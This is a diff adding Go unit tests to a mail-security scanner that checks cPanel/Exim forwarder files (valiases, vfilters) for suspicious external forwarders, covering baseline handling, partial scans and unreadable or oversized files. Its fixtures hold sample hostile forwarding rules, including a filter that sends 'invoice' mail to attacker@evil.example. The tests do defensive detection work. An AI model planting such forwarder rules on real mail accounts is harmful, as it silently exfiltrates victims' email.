@@ -351,6 +351,264 @@ func TestCheckForwardersStaysSilentForUnknownFilesBeforeBaseline(t *testing.T) {
 	}
 }
 
+func TestCheckForwardersDoesNotBaselinePartialScan(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC)
+	oldPath := "/etc/valiases/aaa-legacy.test"
+	recentPath := "/etc/valiases/zzz-recent.test"
+	contents := map[string]string{
+		oldPath:    "victim: attacker@evil.example\n",
+		recentPath: "victim: other@evil.example\n",
+	}
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == "/etc/valiases/*" {
+				return []string{oldPath, recentPath}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{
+			oldPath:    now.Add(-time.Hour),
+			recentPath: now,
+		}),
+		open: func(name string) (*os.File, error) {
+			content, ok := contents[name]
+			if !ok {
+				return nil, os.ErrNotExist
+			}
+			path := filepath.Join(t.TempDir(), filepath.Base(name))
+			if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+				t.Fatal(err)
+			}
+			return os.Open(path)
+		},
+		readFile: func(name string) ([]byte, error) {
+			if name == "/etc/localdomains" {
+				return []byte("aaa-legacy.test\nzzz-recent.test\n"), nil
+			}
+			content, ok := contents[name]
+			if !ok {
+				return nil, os.ErrNotExist
+			}
+			return []byte(content), nil
+		},
+	})
+
+	cfg := &config.Config{}
+	cfg.Thresholds.AccountScanMaxFiles = 1
+	if findings := CheckForwarders(context.Background(), cfg, nil); len(findings) != 0 {
+		t.Fatalf("partial pre-baseline scan findings = %+v, want none", findings)
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got != "" {
+		t.Fatalf("partial scan set baseline marker %q, want empty", got)
+	}
+	storedHash, found := db.GetForwarderHash("valiases:zzz-recent.test")
+	if !found {
+		t.Fatal("partial scan did not store the scanned file hash")
+	}
+	currentHash, err := fileContentHash(recentPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if storedHash != currentHash {
+		t.Fatalf("stored scanned hash %q, want current hash %q", storedHash, currentHash)
+	}
+
+	cfg.Thresholds.AccountScanMaxFiles = 0
+	findings := CheckForwarders(context.Background(), cfg, nil)
+	for _, f := range findings {
+		if f.Check == "email_suspicious_forwarder" {
+			t.Fatalf("file skipped before first complete audit must stay silent: %+v", f)
+		}
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got == "" {
+		t.Fatal("complete scan did not set baseline marker")
+	}
+}
+
+func TestCheckForwardersDoesNotBaselineUnreadableValias(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC)
+	path := "/etc/valiases/legacy.test"
+	content := "victim: attacker@evil.example\n"
+	readable := false
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == "/etc/valiases/*" {
+				return []string{path}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{path: now}),
+		open: func(name string) (*os.File, error) {
+			if name != path || !readable {
+				return nil, os.ErrPermission
+			}
+			tmp := filepath.Join(t.TempDir(), "valias")
+			if err := os.WriteFile(tmp, []byte(content), 0644); err != nil {
+				t.Fatal(err)
+			}
+			return os.Open(tmp)
+		},
+		readFile: func(name string) ([]byte, error) {
+			if name == "/etc/localdomains" {
+				return []byte("legacy.test\n"), nil
+			}
+			if name == path && readable {
+				return []byte(content), nil
+			}
+			return nil, os.ErrPermission
+		},
+	})
+
+	if findings := CheckForwarders(context.Background(), &config.Config{}, nil); len(findings) != 0 {
+		t.Fatalf("unreadable pre-baseline valias findings = %+v, want none", findings)
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got != "" {
+		t.Fatalf("unreadable valias set baseline marker %q, want empty", got)
+	}
+
+	readable = true
+	findings := CheckForwarders(context.Background(), &config.Config{}, nil)
+	for _, f := range findings {
+		if f.Check == "email_suspicious_forwarder" {
+			t.Fatalf("valias unreadable during first audit must stay silent once readable: %+v", f)
+		}
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got == "" {
+		t.Fatal("complete valias scan did not set baseline marker")
+	}
+}
+
+func TestAuditValiasFileDoesNotStoreHashAfterScannerError(t *testing.T) {
+	db := withTestStore(t)
+	path := "/etc/valiases/oversized.test"
+	content := strings.Repeat("x", 70*1024)
+
+	withMockOS(t, &mockOS{
+		open: func(name string) (*os.File, error) {
+			if name != path {
+				return nil, os.ErrNotExist
+			}
+			tmp := filepath.Join(t.TempDir(), "valias")
+			if err := os.WriteFile(tmp, []byte(content), 0644); err != nil {
+				t.Fatal(err)
+			}
+			return os.Open(tmp)
+		},
+		readFile: func(name string) ([]byte, error) {
+			if name == path {
+				return []byte(content), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings, ok := auditValiasFileWithStatus(path, "oversized.test", map[string]bool{"oversized.test": true}, &config.Config{})
+	if ok {
+		t.Fatal("oversized valias scan reported complete, want incomplete")
+	}
+	if len(findings) != 0 {
+		t.Fatalf("findings = %+v, want none from unparsable valias file", findings)
+	}
+	if _, found := db.GetForwarderHash("valiases:oversized.test"); found {
+		t.Fatal("incomplete valias scan stored forwarder hash")
+	}
+}
+
+func TestCheckForwardersDoesNotBaselineUnreadableVfilter(t *testing.T) {
+	db := withTestStore(t)
+	now := time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC)
+	path := "/etc/vfilters/legacy.test"
+	content := "to \"attacker@evil.example\"\n"
+	readable := false
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == "/etc/vfilters/*" {
+				return []string{path}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{path: now}),
+		readFile: func(name string) ([]byte, error) {
+			if name == "/etc/localdomains" {
+				return []byte("legacy.test\n"), nil
+			}
+			if name == path && readable {
+				return []byte(content), nil
+			}
+			return nil, os.ErrPermission
+		},
+	})
+
+	if findings := CheckForwarders(context.Background(), &config.Config{}, nil); len(findings) != 0 {
+		t.Fatalf("unreadable pre-baseline vfilter findings = %+v, want none", findings)
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got != "" {
+		t.Fatalf("unreadable vfilter set baseline marker %q, want empty", got)
+	}
+
+	readable = true
+	findings := CheckForwarders(context.Background(), &config.Config{}, nil)
+	for _, f := range findings {
+		if f.Check == "email_suspicious_forwarder" {
+			t.Fatalf("vfilter unreadable during first audit must stay silent once readable: %+v", f)
+		}
+	}
+	if got := db.GetMetaString("email:fwd_last_refresh"); got == "" {
+		t.Fatal("complete vfilter scan did not set baseline marker")
+	}
+}
+
+func TestCheckForwardersFlagsExternalVfilterInNewFileAfterBaseline(t *testing.T) {
+	db := withTestStore(t)
+	if err := db.SetMetaString("email:fwd_last_refresh", "2026-05-01T00:00:00Z"); err != nil {
+		t.Fatal(err)
+	}
+
+	now := time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC)
+	path := "/etc/vfilters/newdomain.test"
+	content := `if
+ $header_subject: contains "invoice"
+then
+ to "attacker@evil.example"
+endif
+`
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == "/etc/vfilters/*" {
+				return []string{path}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{path: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("newdomain.test\n"), nil
+			case path:
+				return []byte(content), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings := CheckForwarders(context.Background(), &config.Config{}, nil)
+	var hit bool
+	for _, f := range findings {
+		if f.Check == "email_suspicious_forwarder" && strings.Contains(f.Message, "newly added") {
+			hit = true
+		}
+	}
+	if !hit {
+		t.Fatalf("new external vfilter file after baseline produced no finding: %+v", findings)
+	}
+}
+
 func TestCheckForwardersRanksValiasesByMtime(t *testing.T) {
 	withTestStore(t)
 	now := time.Date(2026, 5, 22, 12, 0, 0, 0, time.UTC)
